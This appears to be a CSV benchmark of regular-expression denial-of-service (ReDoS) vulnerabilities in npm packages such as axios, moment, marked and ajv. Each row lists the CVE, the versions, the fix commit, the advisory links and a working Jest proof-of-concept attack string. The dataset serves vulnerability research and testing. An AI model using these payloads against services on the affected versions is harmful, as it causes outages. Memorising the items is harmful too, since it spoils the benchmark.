Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
redos,,revalidator,0.3.1,,redos/revalidator_0.3.1,"test(""ReDos in revalidator"", () => {
  const revalidator = require(""revalidator"");
  const measureTime = require(""../utils"").measureTime;
  var myObj = {
    url: ""ftp://0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0."",
  };
  let t = measureTime(function () {
    revalidator.validate(myObj, {
      properties: {
        url: {
          description: ""the url the object should be stored at"",
          type: ""string"",
          format: ""url"",
          required: true,
        },
      },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,revalidator.js:289:19,https://securitylab.github.com/advisories/GHSL-2020-352-redos-revalidator/; 
redos,,github-url-to-object,4.0.2,4.0.4,redos/github-url-to-object_4.0.2,"test(""ReDos in github-url-to-object"", () => {
  const measureTime = require(""../utils"").measureTime;
  const gh = require(""github-url-to-object"");
  let prefix = ""a/a"";
  let pump = ""a"";
  let suffix = ""a/"";
  let attackString = prefix;
  for (let i = 0; i < 25000; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let t = measureTime(function () {
    gh(attackString);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,commonjs.js:19:27,https://security.snyk.io/vuln/npm:github-url-to-object:20180226; 
redos,CVE-2021-27290,ssri,8.0.0,8.0.1,redos/ssri_8.0.0,"test(""ReDos in ssri"", () => {
  const measureTime = require(""../utils"").measureTime;
  const ssri = require(""ssri"");
  const integrity =
    ""sha512-00000000000000000000000000000000000000000000"" +
    ""?"".repeat(25) +
    ""\x1F"";
  let t = measureTime(function () {
    const parsed = ssri.parse(integrity, {
      strict: true,
      single: true,
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2,index.js:123:31,https://security.snyk.io/vuln/SNYK-JS-SSRI-1246392; https://github.com/advisories/GHSA-vx3p-948g-6vhq
redos,CVE-2017-16116,string,3.3.3,,redos/string_3.3.3,"test(""ReDos in string"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const string = require(""string"");
  let t = measureTime(function () {
    string(genstr(50000, ""9"")).underscore();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,string.js:618:68,https://security.snyk.io/vuln/npm:string:20170907; https://github.com/advisories/GHSA-g36h-6r4f-3mqp
redos,CVE-2021-3807,ansi-regex,4.1.0,>=2.1.1 <3.0.1 >=4.0.0 <4.1.1 >=5.0.0 <5.0.1 >=6.0.0 <6.0.1,redos/ansi-regex_4.1.0,"test(""ReDos in ansi-regex"", () => {
  const ansiRegex = require(""ansi-regex"");
  const measureTime = require(""../utils"").measureTime;
  var attack_str = ""\u001B[""+"";"".repeat(2*10000);
  let t = measureTime(function () {
    ansiRegex().test(attack_str); 
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1,,https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908; 
redos,,checkit,0.7.0,,redos/checkit_0.7.0,"test(""ReDoS in checkit"", () => {
  const measureTime = require(""../utils"").measureTime;
  const check = require(""checkit"");
  const prefix = ""http://a"";
  const pump = ""a"";
  const suffix = ""\t"";
  const nPumps = 1000000;
  let url = prefix;
  for (let i = 0; i < nPumps; i++) {
    url += pump;
  }
  url += suffix;
  let t = measureTime(function () {
    check(url);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/tgriesser/checkit/pull/94,,https://security.snyk.io/vuln/npm:checkit:20180226; 
redos,,remove-markdown,0.3.0,,redos/remove-markdown_0.3.0,"test(""ReDos in remove-markdown"", () => {
  const measureTime = require(""../utils"").measureTime;
  const removeMarkdown = require(""remove-markdown"");
  const paragraph =
    '\n## This is a long ""' + "" "".repeat(200) + '"" heading ##\n';
  let t = measureTime(function () {
    removeMarkdown(paragraph);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:48:8,https://security.snyk.io/vuln/SNYK-JS-REMOVEMARKDOWN-73635; 
redos,CVE-2021-3803,nth-check,2.0.0,2.0.1,redos/nth-check_2.0.0,"//https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0/
test(""ReDos in nth-check"", () => {
  const measureTime = require(""../utils"").measureTime;
  const nthCheck = require(""nth-check"");

  let attack_str = ""2n"" + "" "".repeat(50000) + ""!"";

  let t = measureTime(function () {
    try {
      nthCheck.parse(attack_str);
    } catch (e) {}
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726,parse.js:22:26,https://github.com/advisories/GHSA-rp65-9cf3-cjxr; https://security.snyk.io/vuln/SNYK-JS-NTHCHECK-1586032
redos,CVE-2020-7753,trim,0.0.1,0.0.3,redos/trim_0.0.1,"test(""ReDos in trim"", () => {
  const measureTime = require(""../utils"").measureTime;
  const trim = require(""trim"");
  let t = measureTime(function () {
    trim(""1"" + "" "".repeat(50000) + ""1"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:5:14,https://security.snyk.io/vuln/SNYK-JS-TRIM-1017038; https://github.com/advisories/GHSA-w5p7-h5w8-2hfq
redos,CVE-2021-3749,axios,0.21.0,0.21.3,redos/axios_0.21.0,"function build_blank(n) {
  var ret = ""1"";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }
  return ret + ""1"";
}
test(""ReDoS in axios"", () => {
  const { trim } = require(""axios/lib/utils"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    trim(build_blank(50000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929,utils.js:190:34,https://security.snyk.io/vuln/SNYK-JS-AXIOS-1579269; https://github.com/advisories/GHSA-cph5-m8f7-6c5x
redos,CVE-2017-16119,fresh,0.5.0,0.5.2,redos/fresh_0.5.0,"test(""ReDos in fresh"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var fresh = require(""fresh"");
  let str = genstr(60000, "" "") + ""x"";
  let t = measureTime(function () {
    fresh({ ""if-none-match"": str }, { etag: 23 });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec,index.js:61:40,https://security.snyk.io/vuln/npm:fresh:20170908; https://github.com/advisories/GHSA-9qj9-36jm-prpv
redos,CVE-2021-23353,jspdf,2.1.1,2.3.1,redos/jspdf_2.1.1,"test(""ReDos in jspdf"", () => {
  const measureTime = require(""../utils"").measureTime;
  const { jsPDF } = require(""jspdf"");
  const doc = new jsPDF();
  doc.text(""Hello world"", 10, 10);
  let t = measureTime(function () {
    try {      
      doc.addImage(""data:image/jpeg;"" + ""charset=x"".repeat(25) + ""!base64,"", 'JPEG', 1, 2);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/MrRio/jsPDF/commit/d8bb3b39efcd129994f7a3b01b632164144ec43e,jspdf.node.min.js:86:5935,https://security.snyk.io/vuln/SNYK-JS-JSPDF-1073626; https://github.com/advisories/GHSA-57f3-gghm-9mhc
redos,CVE-2017-16099,no-case,2.3.1,2.3.2,redos/no-case_2.3.1,"test(""ReDos in no-case"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const cc = require(""no-case"");
  let t = measureTime(function () {
    cc(genstr(50000, ""X""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,no-case.js:34:6,https://security.snyk.io/vuln/npm:no-case:20170908; https://github.com/advisories/GHSA-ff6r-5jwm-8292
redos,,platform,1.3.4,,redos/platform_1.3.4,"test(""ReDos in platform"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const platform = require(""platform"");
  let t = measureTime(function () {
    var agent = platform.parse(""Windows Icarus6j"" + genstr(40000, "" "") + "" "");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,platform.js:117:10,https://security.snyk.io/vuln/npm:platform.js:20170907; 
redos,CVE-2021-23343,path-parse,1.0.6,1.0.7,redos/path-parse_1.0.6,"function build_attack(n) {
  var ret = """";
  for (var i = 0; i < n; i++) {
    ret += ""/"";
  }
  return ret + ""\u25CE"";
}
test(""ReDos in path-parse"", () => {
  const measureTime = require(""../utils"").measureTime;
  const pathParse = require(""path-parse"");
  let t = measureTime(function () {
    let attack_str = build_attack(50000);
    pathParse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:59:22,https://security.snyk.io/vuln/SNYK-JS-PATHPARSE-1077067; https://github.com/advisories/GHSA-hj48-42vr-x3v9
redos,,ramda,0.27.1,0.27.2,redos/ramda_0.27.1,"//https://www.huntr.dev/bounties/51dfe927-1bf1-4b36-91ca-2197337e663a/
test(""ReDos in ramda"", () => {
  const { trim } = require(""ramda"");
  const measureTime = require(""../utils"").measureTime;
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";

  let t = measureTime(function () {
    trim(build_blank(50000));
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});

function build_blank(n) {
  var ret = ""1"";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }

  return ret + ""1"";
}
",https://github.com/ramda/ramda/commit/37af6ae2ca8b94656996dd27fb0a1f208d69134e,trim.js:33:35,; https://security.snyk.io/vuln/SNYK-JS-RAMDA-1582370
redos,CVE-2015-8315,millisecond,0.1.1,0.1.2,redos/millisecond_0.1.1,"test(""ReDos in millisecond"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var ms = require(""millisecond"");
  let attack_str = genstr(20000, ""1"") + ""x"";
  let t = measureTime(function () {
    ms(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:43:21,https://security.snyk.io/vuln/npm:millisecond:20151120; https://github.com/advisories/GHSA-3fx5-fwvr-xrjg
redos,,papaparse,5.1.1,5.2.0,redos/papaparse_5.1.1,"test(""ReDos in ssri"", () => {
  const measureTime = require(""../utils"").measureTime;
  const Papa = require(""papaparse"");
  const input = ""0"".repeat(30000);
  const options = { dynamicTyping: true };
  let t = measureTime(function () {
    Papa.parse(input + ""a"", options);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/mholt/PapaParse/commit/235a12758cd77266d2e98fd715f53536b34ad621,papaparse.js:1142:14,https://security.snyk.io/vuln/SNYK-JS-PAPAPARSE-564258; https://github.com/advisories/GHSA-qvjc-g5vr-mfgr
redos,,rgb2hex,0.1.0,0.1.6,redos/rgb2hex_0.1.0,"//https://hackerone.com/reports/319629
test(""ReDos in rgb2hex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const rgb2hex = require(""rgb2hex"");

  const color = ""rgb("" + genstr(14, ""0000,"") + ""000"";

  let t = measureTime(function () {
    try {
      rgb2hex(color);
    } catch {}
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",,index.js:25:73,https://security.snyk.io/vuln/npm:rgb2hex:20180429; https://github.com/advisories/GHSA-65p8-3hm4-h9h8
redos,,conventional-commits-parser,3.2.0,3.2.3,redos/conventional-commits-parser_3.2.0,"test(""ReDos in conventional-commits-parser"", () => {
  const measureTime = require(""../utils"").measureTime;
  const conventionalCommitsParser = require(""conventional-commits-parser"");
  let payload = ""b"" + ""\r\n"".repeat(2000000) + ""b"";
  let t = measureTime(function () {
    conventionalCommitsParser(payload);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/conventional-changelog/conventional-changelog/commit/c696fa35f93e0ee13728d6cf1221587ac6386311,,https://github.com/conventional-changelog/conventional-changelog/pull/861/commits/2fcd2d4e2a05986b3cd410d2d0db7d975ccca0f1; https://security.snyk.io/vuln/SNYK-JS-CONVENTIONALCOMMITSPARSER-1766960
redos,,content,3.0.5,4.0.4,redos/content_3.0.5,"test(""ReDoS in content"", () => {
  const measureTime = require(""../utils"").measureTime;
  const content = require(""content"");
  let t = measureTime(function () {
    content.disposition(""form-data;x"" + "" "".repeat(2000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/hapijs/content/commit/96beb34f7c38a08d024dbf9cd63865c56e2955d9,index.js:84:34,https://security.snyk.io/vuln/npm:content:20180305; https://github.com/advisories/GHSA-x6wp-rfwh-hcx7
redos,,content-type-parser,1.0.1,,redos/content-type-parser_1.0.1,"test(""ReDoS in content-type-parser"", () => {
  const measureTime = require(""../utils"").measureTime;
  const contentTypeParser = require(""content-type-parser"");
  let t = measureTime(function () {
    contentTypeParser(""/"".repeat(30000) + ""\r\n"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jsdom/whatwg-mimetype/commit/26c539a699778f8743b8319c298b5fb28a4328d0,content-type-parser.js:61:46,https://security.snyk.io/vuln/npm:content-type-parser:20170905; 
redos,,natural,5.1.0,5.1.11,redos/natural_5.1.0,"test(""ReDos in natural"", () => {
  const measureTime = require(""../utils"").measureTime;
  const diceCoefficient = require(""natural/lib/natural/distance/dice_coefficient.js"");
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
  let t = measureTime(function () {
    diceCoefficient(attack_str, attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/NaturalNode/natural/commit/90e85afb20e76560bc555d83abad3bc919388381,dice_coefficient.js:54:28,https://github.com/NaturalNode/natural/issues/625; https://security.snyk.io/vuln/SNYK-JS-NATURAL-1915418
redos,CVE-2021-3868,prompts,2.4.0,2.4.2,redos/prompts_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737
test(""ReDos in prompts"", () => {
  const measureTime = require(""../utils"").measureTime;
  const strip = require(""prompts/lib/util/strip.js"");

  let attack_str = ""\u001B["" + "";"".repeat(16000);

  let t = measureTime(function () {
    strip(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",,strip.js:10:40,https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737; 
redos,CVE-2020-27511,prototype,0.0.5,,redos/prototype_0.0.5,"test(""ReDos in prototype"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const prototype = require(""prototype/lib/String"");
  let t = measureTime(function () {
    let attack_str = ""hello <span> <a "" + genstr(37, ""'"") + ""!"";
    attack_str.stripTags();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,String.js:84:17,https://github.com/yetingli/PoCs/blob/main/CVE-2020-27511/Prototype.md; 
redos,,vant,2.12.11,3.0.7,redos/vant_2.12.11,"test(""ReDos in vant"", () => {
  const isEmail = require(""vant/lib/utils/validate/email"").isEmail;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    var check = isEmail(
      ""a@0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,email.js:9:14,https://securitylab.github.com/advisories/GHSL-2020-343-redos-Vant/; 
redos,,html-dom-parser,0.1.2,0.1.3,redos/html-dom-parser_0.1.2,"test(""ReDos in html-dom-parser"", () => {
  const parse = require(""html-dom-parser"");
  const measureTime = require(""../utils"").measureTime;
  const genstr = require(""../utils"").genstr;
  let attack_str = ""<head"" + genstr(4000000, "" S"");
  let t = measureTime(function () {
    parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/remarkablemark/html-dom-parser/commit/b80d699bbbd45d254379e6916152c918998e3b10,,https://security.snyk.io/vuln/npm:html-dom-parser:20180220; 
redos,CVE-2017-15010,tough-cookie,2.3.2,2.3.3,redos/tough-cookie_2.3.2,"test(""ReDos in tough-cookie"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const tough = require(""tough-cookie"");
  let str = ""x"" + genstr(50000, "" "") + ""x"";
  let Cookie = tough.Cookie;
  let t = measureTime(function () {
    var cookie = Cookie.parse(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,cookie.js:330:23,https://security.snyk.io/vuln/npm:tough-cookie:20170905; https://github.com/advisories/GHSA-g7q5-pjjr-gqvp
redos,CVE-2022-21670,markdown-it,9.1.0,12.3.2,redos/markdown-it_9.1.0,"test(""ReDos in markdown-it"", () => {
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    require(""markdown-it"")(""commonmark"").parse(""*_"".repeat(60000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWNIT-2331914; 
redos,CVE-2021-23371,chrono-node,2.2.3,2.2.4,redos/chrono-node_2.2.3,"test(""ReDoS in chrono-node"", () => {
  const measureTime = require(""../utils"").measureTime;
  const chrono = require(""chrono-node"");
  let attack_str = ""BGR3"" + "" "".repeat(40000) + ""186'"";
  let t = measureTime(function () {
    chrono.parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/wanasit/chrono/commit/98815b57622443b5c498a427210ebd603d705f4c,chrono.js:42:29,https://security.snyk.io/vuln/SNYK-JS-CHRONONODE-1083228; https://github.com/advisories/GHSA-hpmr-g4pq-jhgp
redos,CVE-2021-21306,marked,0.3.6,2.0.0,redos/marked_0.3.6,"test(""ReDos in marked"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const marked = require(""marked"");
  let str = genstr(8, ""`"") + genstr(700, "" "") + genstr(11, ""`"");
  let t = measureTime(function () {
    var agent = marked(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/markedjs/marked/commit/7293251c438e3ee968970f7609f1a27f9007bccd,marked.js:662:31,https://security.snyk.io/vuln/SNYK-JS-MARKED-1070800; https://github.com/advisories/GHSA-4r62-v4vq-hr96
redos,CVE-2021-23392,locutus,2.0.10,2.0.15,redos/locutus_2.0.10,"test(""ReDos in locutus"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const inet_pton = require(""locutus/php/network/inet_pton"");
  const attack_str = new Array(30).fill(""a"").join("""") + ""."";
  let t = measureTime(function () {
    inet_pton(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/locutusjs/locutus/commit/eb863321990e7e5514aa14f68b8d9978ece9e65e,inet_pton.js:30:9,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-1090597; https://github.com/advisories/GHSA-39q4-p535-c852
redos,,simple-markdown,0.7.2,0.6.1,redos/simple-markdown_0.7.2,"test(""ReDos in simple-markdown"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const SimpleMarkdown = require(""simple-markdown"");
  const mdParse = SimpleMarkdown.defaultBlockParse;
  let t = measureTime(function () {
    mdParse(
      ""~~\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}}~""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/Khan/simple-markdown/commit/015a719bf5cdc561feea05500ecb3274ef609cd2,simple-markdown.js:492:26,https://security.snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-469242; https://github.com/advisories/GHSA-qj3f-9gmq-fwv5
redos,CVE-2017-16138,mime,1.4.0,2.0.3,redos/mime_1.4.0,"test(""ReDos in mime"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const mime = require(""mime"");
  let str = genstr(81750, ""5"") + """";
  let t = measureTime(function () {
    mime.lookup(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0,mime.js:70:18,https://security.snyk.io/vuln/npm:mime:20170907; https://github.com/advisories/GHSA-wrvr-8mpx-r7pp
redos,,sanitize,2.0.0, 2.1.0,redos/sanitize_2.0.0,"test(""ReDos in sanitize"", () => {
  const measureTime = require(""../utils"").measureTime;
  const sanitize = require(""sanitize"");
  const sanitizer = sanitize();
  let t = measureTime(function () {
    sanitizer.my.url(""a"" + (""."" + ""a"".repeat(55)).repeat(4) + ""#"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/pocketly/node-sanitize/commit/4fd57530367ea9f2570b1e57d1a1a32e7f5d644f#diff-bd042f5439b55acdcce363c79e2f55d6R148,Sanitizer.js:148:37,https://security.snyk.io/vuln/npm:sanitize:20180225; 
redos,CVE-2017-18077,brace-expansion,1.1.6,1.1.7,redos/brace-expansion_1.1.6,"test(""ReDoS in brace-expansion"", () => {
  const expand = require(""brace-expansion"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    expand(""{"" + "","".repeat(24) + ""\n}"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3,index.js:109:35,https://security.snyk.io/vuln/npm:brace-expansion:20170302; https://github.com/advisories/GHSA-832h-xg76-4gv6
redos,CVE-2020-26289,date-and-time,0.14.1,0.14.2,redos/date-and-time_0.14.1,"test(""ReDoS in date-and-time"", () => {
  const measureTime = require(""../utils"").measureTime;
  const date = require(""date-and-time"");
  let attack_str = ""["" + ""z"".repeat(25) + """";
  let t = measureTime(function () {
    date.compile(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/knowledgecode/date-and-time/commit/9e4b501eacddccc8b1f559fb414f48472ee17c2a,date-and-time.js:141:27,https://security.snyk.io/vuln/SNYK-JS-DATEANDTIME-1054430; https://github.com/advisories/GHSA-r92x-f52r-x54g
redos,CVE-2017-18214,moment,2.18.1,2.19.3,redos/moment_2.18.1,"test(""ReDos in moment"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const moment = require(""moment"");
  let str = genstr(50000, ""1"") + """";
  let t = measureTime(function () {
    moment(str, ""MMM"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,moment.js:2364:31,https://security.snyk.io/vuln/npm:moment:20170905; https://github.com/advisories/GHSA-446m-mv8f-q348
redos,,email-existence,0.1.5,0.1.6,redos/email-existence_0.1.5,"test(""ReDos in email-existence"", () => {
  const measureTime = require(""../utils"").measureTime;
  const emailExistence = require(""email-existence"");
  let t = measureTime(function () {
    emailExistence.check(""@"".repeat(50000) + "" "", () => {});
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,index.js:8:19,https://security.snyk.io/vuln/npm:email-existence:20180225; 
redos,,markdown-to-jsx,5.4.2,,redos/markdown-to-jsx_5.4.2,"test(""ReDos in markdown-to-jsx"", () => {
  const { compiler } = require(""markdown-to-jsx"");
  const measureTime = require(""../utils"").measureTime;
  const { genstr } = require(""../utils"");
  attack_str = '<a foobar=""foo' + genstr(90000, ""\\!"") + ""/>"";
  let t = measureTime(function () {
    compiler(attack_str, { disableParsingRawHTML: false });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,,https://securitylab.github.com/advisories/GHSL-2020-300-redos-markdown-to-jsx/; 
redos,,d3-color,2.0.0,,redos/d3-color_2.0.0,"test(""ReDoS in d3-color"", () => {
  const measureTime = require(""../utils"").measureTime;
  const d3Color = require(""d3-color"");
  let attack_str = ""rgb("" + ""1"".repeat(80000) + ""!"";
  let t = measureTime(function () {
    d3Color.rgb(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/d3/d3-color/commit/4c2be7e59a317d0af7c3d66e44fa888f02163a59,d3-color.js:221:27,https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592; 
redos,,highlight.js,10.4.0,10.4.1,redos/highlight.js_10.4.0,"test(""ReDos in highlight.js"", () => {
  const measureTime = require(""../utils"").measureTime;
  let hljs = require(""highlight.js/lib/core"");
  let r = require(""highlight.js/lib/languages/r"");
  hljs.registerLanguage(""r"", r);
  let t = measureTime(function () {
    hljs.highlight(
      ""r"",
      ""#' @param `x"" + ""\\_"".repeat(22) + ""_ code{numeric} foobar""
    ).value;
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c,core.js:858:36,https://security.snyk.io/vuln/SNYK-JS-HIGHLIGHTJS-1048676; https://github.com/advisories/GHSA-vfrc-7r7c-w9mx
redos,,is-my-json-valid,2.20.1,2.20.2,redos/is-my-json-valid_2.20.1,"test(""ReDos in is-my-json-valid"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const imjv = require(""is-my-json-valid"");
  const validate = imjv({
    maxLength: 100,
    format: ""style"",
  });
  let t = measureTime(function () {
    validate("" "".repeat(4000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/mafintosh/is-my-json-valid/commit/c3fc04fc455d40e9b29537f8e2c73a28ce106edb,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597165; https://github.com/advisories/GHSA-f522-ffg8-j8r6
redos,CVE-2020-7760,codemirror,5.58.0,5.58.2,redos/codemirror_5.58.0,"let basicCTypes = [
  ""int"",
  ""long"",
  ""char"",
  ""short"",
  ""double"",
  ""float"",
  ""unsigned"",
  ""signed"",
  ""void"",
  ""bool"",
];
function cTypes(identifier) {
  return (
    basicCTypes.propertyIsEnumerable(identifier) || /.+_t$/.test(identifier)
  );
}
test(""ReDos in codemirror"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let str = genstr(65536, ""a"");
  let t = measureTime(function () {
    cTypes(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/codemirror/CodeMirror/commit/55d0333907117c9231ffdf555ae8824705993bbb,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-CODEMIRROR-1016937; https://github.com/advisories/GHSA-4gw3-8f77-f72c
redos,CVE-2020-15366,ajv,5.2.2,6.12.3,redos/ajv_5.2.2,"test(""ReDoS in ajv"", () => {
  const measureTime = require(""../utils"").measureTime;
  let Ajv = require(""ajv"");
  let ajv = new Ajv();
  let t = measureTime(function () {
    ajv.compile({
      type: ""object"",
      properties: {
        foo: {
          type: ""string"",
          oneOf: [{ pattern: ""if("".repeat(10000) + ""x"" + "")"".repeat(10000) }],
        },
      },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,util.js:143:14,https://security.snyk.io/vuln/SNYK-JS-AJV-584908; 
redos,,truncate,2.0.0,2.0.1,redos/truncate_2.0.0,"test(""ReDos in truncate"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const truncate = require(""truncate"");
  let prefix = ""-@w--w--"";
  let pump = ""ww--"";
  let suffix = """";
  let nPumps = 20000;
  let attackString = prefix;
  for (var i = 0; i < nPumps; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let input = ""Hey "" + attackString;
  let t = measureTime(function () {
    truncate(input, 4);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/FGRibreau/node-truncate/commit/a3cea056427b2dfbbffebf24a95419b09db23b22,truncate.js:47:33,https://security.snyk.io/vuln/npm:truncate:20180225; 
redos,,ducktype,1.2.0,1.2.1,redos/ducktype_1.2.0,"test(""ReDos in ducktype"", () => {
  const measureTime = require(""../utils"").measureTime;
  const ducktype = require(""ducktype"");
  let attack_str = ""https://"" + (""."" + ""a"".repeat(110)).repeat(7) + ""\n"";
  let t = measureTime(function () {
    console.log(ducktype.url.test(attack_str));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
